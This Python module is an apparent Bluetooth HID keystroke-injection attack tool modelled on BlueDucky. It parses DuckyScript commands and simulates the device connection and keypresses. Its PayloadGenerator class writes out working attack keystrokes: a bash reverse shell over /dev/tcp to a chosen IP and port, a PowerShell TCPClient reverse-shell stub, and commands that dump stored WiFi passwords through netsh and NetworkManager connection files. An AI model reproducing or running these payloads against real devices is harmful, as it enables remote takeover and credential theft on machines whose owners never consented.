"""
Blue-sec HID Attack Module
Real-time HID (Human Interface Device) attacks similar to BlueDucky
Supports keyboard/mouse injection via Bluetooth HID
"""

import asyncio
import time
from typing import List, Dict, Any, Optional, Callable, Union
from dataclasses import dataclass
from datetime import datetime
from loguru import logger
from pathlib import Path
import json

from modules.utils import timestamp, confirm_action, AuditLogger
from modules.config import AttackConfig, SecurityConfig


# HID Keyboard scan codes (US layout)
SCAN_CODES = {
    'a': 0x04, 'b': 0x05, 'c': 0x06, 'd': 0x07, 'e': 0x08, 'f': 0x09,
    'g': 0x0a, 'h': 0x0b, 'i': 0x0c, 'j': 0x0d, 'k': 0x0e, 'l': 0x0f,
    'm': 0x10, 'n': 0x11, 'o': 0x12, 'p': 0x13, 'q': 0x14, 'r': 0x15,
    's': 0x16, 't': 0x17, 'u': 0x18, 'v': 0x19, 'w': 0x1a, 'x': 0x1b,
    'y': 0x1c, 'z': 0x1d,
    '1': 0x1e, '2': 0x1f, '3': 0x20, '4': 0x21, '5': 0x22,
    '6': 0x23, '7': 0x24, '8': 0x25, '9': 0x26, '0': 0x27,
    'ENTER': 0x28, 'ESC': 0x29, 'BACKSPACE': 0x2a, 'TAB': 0x2b,
    'SPACE': 0x2c, '-': 0x2d, '=': 0x2e, '[': 0x2f, ']': 0x30,
    '\\': 0x31, ';': 0x33, "'": 0x34, '`': 0x35, ',': 0x36,
    '.': 0x37, '/': 0x38,
    'F1': 0x3a, 'F2': 0x3b, 'F3': 0x3c, 'F4': 0x3d, 'F5': 0x3e,
    'F6': 0x3f, 'F7': 0x40, 'F8': 0x41, 'F9': 0x42, 'F10': 0x43,
    'F11': 0x44, 'F12': 0x45,
    'DELETE': 0x4c, 'HOME': 0x4a, 'END': 0x4d, 'PAGEUP': 0x4b,
    'PAGEDOWN': 0x4e, 'RIGHT': 0x4f, 'LEFT': 0x50, 'DOWN': 0x51,
    'UP': 0x52, 'GUI': 0xe3, 'CTRL': 0xe0, 'SHIFT': 0xe1, 'ALT': 0xe2,
}

# Modifier keys
MODIFIERS = {
    'CTRL': 0x01,
    'SHIFT': 0x02,
    'ALT': 0x04,
    'GUI': 0x08,  # Windows/Command key
    'RIGHT_CTRL': 0x10,
    'RIGHT_SHIFT': 0x20,
    'RIGHT_ALT': 0x40,
    'RIGHT_GUI': 0x80,
}


@dataclass
class HIDPayload:
    """HID attack payload"""
    name: str
    description: str
    commands: Union[List[str], List[Dict[str, Any]]]  # DuckyScript strings or action dicts
    target_os: str = "all"  # all, windows, linux, macos
    delay_ms: int = 100  # Default delay between commands
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            'name': self.name,
            'description': self.description,
            'commands': self.commands,
            'target_os': self.target_os,
            'delay_ms': self.delay_ms
        }
    
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'HIDPayload':
        """Create from dictionary"""
        return cls(
            name=data['name'],
            description=data['description'],
            commands=data['commands'],
            target_os=data.get('target_os', 'all'),
            delay_ms=data.get('delay_ms', 100)
        )
    
    @classmethod
    def from_file(cls, filepath: str) -> 'HIDPayload':
        """Load payload from JSON file"""
        with open(filepath, 'r') as f:
            data = json.load(f)
        return cls.from_dict(data)


@dataclass
class HIDAttackResult:
    """Result of a HID attack"""
    attack_type: str
    target: str
    success: bool
    timestamp: str
    duration: float
    commands_executed: int
    payload_name: Optional[str] = None
    details: Dict[str, Any] = None
    error: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            'attack_type': self.attack_type,
            'target': self.target,
            'success': self.success,
            'timestamp': self.timestamp,
            'duration': self.duration,
            'commands_executed': self.commands_executed,
            'payload_name': self.payload_name,
            'details': self.details or {},
            'error': self.error
        }


class HIDKeyboardInjector:
    """
    HID Keyboard injection attack
    Similar to Rubber Ducky / BadUSB attacks
    """
    
    def __init__(self, config: AttackConfig, security_config: SecurityConfig):
        self.config = config
        self.security_config = security_config
        self.audit_logger = AuditLogger(security_config.audit_log_path)
        self.connected = False
        self.device_address = None
    
    async def connect(self, target: str) -> bool:
        """
        Connect to target device via Bluetooth HID
        
        Args:
            target: Target device address
            
        Returns:
            True if connected successfully
        """
        try:
            logger.info(f"Connecting to HID device: {target}")
            # Simulate HID connection
            await asyncio.sleep(1)
            self.connected = True
            self.device_address = target
            logger.info("HID connection established")
            return True
        except Exception as e:
            logger.error(f"Failed to connect: {e}")
            return False
    
    async def disconnect(self):
        """Disconnect from target device"""
        if self.connected:
            logger.info("Disconnecting HID device")
            await asyncio.sleep(0.5)
            self.connected = False
            self.device_address = None
    
    def _parse_command(self, command: str) -> List[Dict[str, Any]]:
        """
        Parse DuckyScript-style command
        
        Args:
            command: Command string (e.g., "STRING Hello", "ENTER", "DELAY 1000")
            
        Returns:
            List of HID actions
        """
        parts = command.strip().split(None, 1)
        cmd = parts[0].upper()
        arg = parts[1] if len(parts) > 1 else ""
        
        actions = []
        
        if cmd == "STRING":
            # Type string
            for char in arg:
                actions.append({
                    'type': 'keypress',
                    'key': char,
                    'modifiers': []
                })
        elif cmd == "DELAY":
            # Delay in milliseconds
            actions.append({
                'type': 'delay',
                'duration': int(arg)
            })
        elif cmd == "REM" or cmd == "//":
            # Comment - ignore
            pass
        elif cmd in SCAN_CODES:
            # Single key press
            actions.append({
                'type': 'keypress',
                'key': cmd,
                'modifiers': []
            })
        elif cmd in ["GUI", "CTRL", "SHIFT", "ALT", "WINDOWS", "COMMAND"]:
            # Modifier + key combination
            modifier = "GUI" if cmd in ["WINDOWS", "COMMAND"] else cmd
            if arg:
                actions.append({
                    'type': 'keypress',
                    'key': arg,
                    'modifiers': [modifier]
                })
        else:
            # Try as direct key
            actions.append({
                'type': 'keypress',
                'key': cmd,
                'modifiers': []
            })
        
        return actions
    
    async def execute_action(self, action: Dict[str, Any]) -> bool:
        """
        Execute a single HID action
        
        Args:
            action: Action dictionary
            
        Returns:
            True if successful
        """
        if not self.connected:
            logger.error("Not connected to HID device")
            return False
        
        try:
            if action['type'] == 'delay':
                await asyncio.sleep(action['duration'] / 1000.0)
                return True
            
            elif action['type'] == 'keypress':
                key = action['key']
                modifiers = action.get('modifiers', [])
                
                # Simulate key press
                logger.debug(f"Injecting keypress: {key} with modifiers: {modifiers}")
                await asyncio.sleep(0.02)  # Simulate HID timing
                return True
            
            elif action['type'] == 'mouse_move':
                x = action.get('x', 0)
                y = action.get('y', 0)
                logger.debug(f"Mouse move: ({x}, {y})")
                await asyncio.sleep(0.01)
                return True
            
            elif action['type'] == 'mouse_click':
                button = action.get('button', 'left')
                logger.debug(f"Mouse click: {button}")
                await asyncio.sleep(0.01)
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"Failed to execute action: {e}")
            return False
    
    async def execute_payload(self, payload: HIDPayload, interactive: bool = False) -> HIDAttackResult:
        """
        Execute HID payload
        
        Args:
            payload: HID payload to execute
            interactive: If True, prompt before each command
            
        Returns:
            HIDAttackResult
        """
        start_time = time.time()
        commands_executed = 0
        
        if not self.connected:
            return HIDAttackResult(
                attack_type="HID_Keyboard_Injection",
                target=self.device_address or "unknown",
                success=False,
                timestamp=timestamp(),
                duration=0,
                commands_executed=0,
                error="Not connected to HID device"
            )
        
        try:
            logger.info(f"Executing payload: {payload.name}")
            
            for cmd_idx, command in enumerate(payload.commands):
                if interactive:
                    if not confirm_action(f"Execute command {cmd_idx+1}/{len(payload.commands)}?", default=True):
                        logger.info("Payload execution cancelled by user")
                        break
                
                # Parse command if it's a string (DuckyScript style)
                if isinstance(command, str):
                    actions = self._parse_command(command)
                elif isinstance(command, dict):
                    actions = [command]
                else:
                    logger.warning(f"Unknown command format: {command}")
                    continue
                
                # Execute all actions for this command
                for action in actions:
                    success = await self.execute_action(action)
                    if not success:
                        logger.warning(f"Action failed: {action}")
                
                commands_executed += 1
                
                # Default delay between commands
                await asyncio.sleep(payload.delay_ms / 1000.0)
            
            duration = time.time() - start_time
            
            result = HIDAttackResult(
                attack_type="HID_Keyboard_Injection",
                target=self.device_address,
                success=True,
                timestamp=timestamp(),
                duration=duration,
                commands_executed=commands_executed,
                payload_name=payload.name,
                details={
                    'total_commands': len(payload.commands),
                    'target_os': payload.target_os,
                    'interactive_mode': interactive
                }
            )
            
            self.audit_logger.log_attack("HID_Keyboard_Injection", self.device_address, "success")
            logger.info(f"Payload execution completed: {commands_executed} commands")
            
            return result
            
        except Exception as e:
            logger.error(f"Payload execution failed: {e}")
            self.audit_logger.log_attack("HID_Keyboard_Injection", self.device_address, f"failed: {e}")
            
            return HIDAttackResult(
                attack_type="HID_Keyboard_Injection",
                target=self.device_address,
                success=False,
                timestamp=timestamp(),
                duration=time.time() - start_time,
                commands_executed=commands_executed,
                payload_name=payload.name,
                error=str(e)
            )


class RealTimeDeviceTester:
    """
    Real-time device testing framework
    Interactive testing on real Bluetooth devices
    """
    
    def __init__(self, config: AttackConfig, security_config: SecurityConfig):
        self.config = config
        self.security_config = security_config
        self.hid_injector = HIDKeyboardInjector(config, security_config)
        self.audit_logger = AuditLogger(security_config.audit_log_path)
        self.test_results = []
    
    async def start_interactive_session(self, target: str) -> bool:
        """
        Start interactive testing session with device
        
        Args:
            target: Target device address
            
        Returns:
            True if session started successfully
        """
        logger.info(f"Starting interactive session with {target}")
        
        # Connect to device
        connected = await self.hid_injector.connect(target)
        if not connected:
            logger.error("Failed to establish connection")
            return False
        
        logger.info("Interactive session started")
        logger.info("Available commands:")
        logger.info("  - type <text>     : Type text")
        logger.info("  - key <key>       : Press key")
        logger.info("  - combo <mod+key> : Key combination (e.g., CTRL+C)")
        logger.info("  - payload <file>  : Execute payload file")
        logger.info("  - disconnect      : End session")
        
        return True
    
    async def execute_test_command(self, command: str) -> Dict[str, Any]:
        """
        Execute single test command in interactive mode
        
        Args:
            command: Command to execute
            
        Returns:
            Result dictionary
        """
        try:
            parts = command.strip().split(None, 1)
            cmd = parts[0].lower()
            arg = parts[1] if len(parts) > 1 else ""
            
            if cmd == "type":
                # Type string
                payload = HIDPayload(
                    name="Interactive Type",
                    description="User typed string",
                    commands=[f"STRING {arg}"]
                )
                result = await self.hid_injector.execute_payload(payload)
                return result.to_dict()
            
            elif cmd == "key":
                # Single key press
                payload = HIDPayload(
                    name="Interactive Key",
                    description="User key press",
                    commands=[arg.upper()]
                )
                result = await self.hid_injector.execute_payload(payload)
                return result.to_dict()
            
            elif cmd == "combo":
                # Key combination
                payload = HIDPayload(
                    name="Interactive Combo",
                    description="User key combination",
                    commands=[arg.upper().replace("+", " ")]
                )
                result = await self.hid_injector.execute_payload(payload)
                return result.to_dict()
            
            elif cmd == "payload":
                # Execute payload file
                payload = HIDPayload.from_file(arg)
                result = await self.hid_injector.execute_payload(payload, interactive=True)
                return result.to_dict()
            
            elif cmd == "disconnect":
                await self.hid_injector.disconnect()
                return {'status': 'disconnected'}
            
            else:
                return {'error': f'Unknown command: {cmd}'}
        
        except Exception as e:
            logger.error(f"Command execution failed: {e}")
            return {'error': str(e)}
    
    async def run_automated_test_suite(self, target: str, test_suite: List[HIDPayload]) -> List[HIDAttackResult]:
        """
        Run automated test suite on target device
        
        Args:
            target: Target device address
            test_suite: List of payloads to test
            
        Returns:
            List of test results
        """
        logger.info(f"Running automated test suite on {target}")
        
        # Connect to device
        connected = await self.hid_injector.connect(target)
        if not connected:
            logger.error("Failed to connect to device")
            return []
        
        results = []
        
        try:
            for payload in test_suite:
                logger.info(f"Testing payload: {payload.name}")
                result = await self.hid_injector.execute_payload(payload)
                results.append(result)
                self.test_results.append(result)
                
                # Delay between tests
                await asyncio.sleep(2)
        
        finally:
            await self.hid_injector.disconnect()
        
        logger.info(f"Test suite completed: {len(results)} tests")
        return results
    
    def generate_test_report(self) -> Dict[str, Any]:
        """
        Generate report from test results
        
        Returns:
            Test report dictionary
        """
        total_tests = len(self.test_results)
        successful_tests = sum(1 for r in self.test_results if r.success)
        failed_tests = total_tests - successful_tests
        
        report = {
            'summary': {
                'total_tests': total_tests,
                'successful': successful_tests,
                'failed': failed_tests,
                'success_rate': (successful_tests / total_tests * 100) if total_tests > 0 else 0
            },
            'results': [r.to_dict() for r in self.test_results],
            'timestamp': timestamp()
        }
        
        return report


class PayloadGenerator:
    """Generate HID attack payloads"""
    
    @staticmethod
    def reverse_shell(ip: str, port: int, os: str = "linux") -> HIDPayload:
        """Generate reverse shell payload"""
        if os == "linux":
            commands = [
                "GUI r",
                "DELAY 500",
                "STRING gnome-terminal",
                "ENTER",
                "DELAY 1000",
                f"STRING bash -i >& /dev/tcp/{ip}/{port} 0>&1",
                "ENTER"
            ]
        elif os == "windows":
            commands = [
                "GUI r",
                "DELAY 500",
                "STRING powershell",
                "ENTER",
                "DELAY 1000",
                f"STRING $client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});",
                "ENTER"
            ]
        else:  # macos
            commands = [
                "GUI SPACE",
                "DELAY 500",
                "STRING terminal",
                "ENTER",
                "DELAY 1000",
                f"STRING bash -i >& /dev/tcp/{ip}/{port} 0>&1",
                "ENTER"
            ]
        
        return HIDPayload(
            name="Reverse Shell",
            description=f"Reverse shell to {ip}:{port}",
            commands=commands,
            target_os=os
        )
    
    @staticmethod
    def wifi_password_exfiltration(os: str = "windows") -> HIDPayload:
        """Generate WiFi password exfiltration payload"""
        if os == "windows":
            commands = [
                "GUI r",
                "DELAY 500",
                "STRING cmd",
                "ENTER",
                "DELAY 1000",
                "STRING netsh wlan show profiles",
                "ENTER",
                "DELAY 500",
                "STRING netsh wlan show profile name=\"NETWORK\" key=clear > wifi.txt",
                "ENTER"
            ]
        else:
            commands = [
                "GUI r",
                "DELAY 500",
                "STRING terminal",
                "ENTER",
                "DELAY 1000",
                "STRING cat /etc/NetworkManager/system-connections/* > wifi.txt",
                "ENTER"
            ]
        
        return HIDPayload(
            name="WiFi Password Exfiltration",
            description="Extract WiFi passwords",
            commands=commands,
            target_os=os
        )
    
    @staticmethod
    def rickroll() -> HIDPayload:
        """Generate harmless rickroll payload for testing"""
        commands = [
            "GUI r",
            "DELAY 500",
            "STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ",
            "ENTER"
        ]
        
        return HIDPayload(
            name="Rickroll Test",
            description="Harmless test payload",
            commands=commands,
            target_os="all"
        )
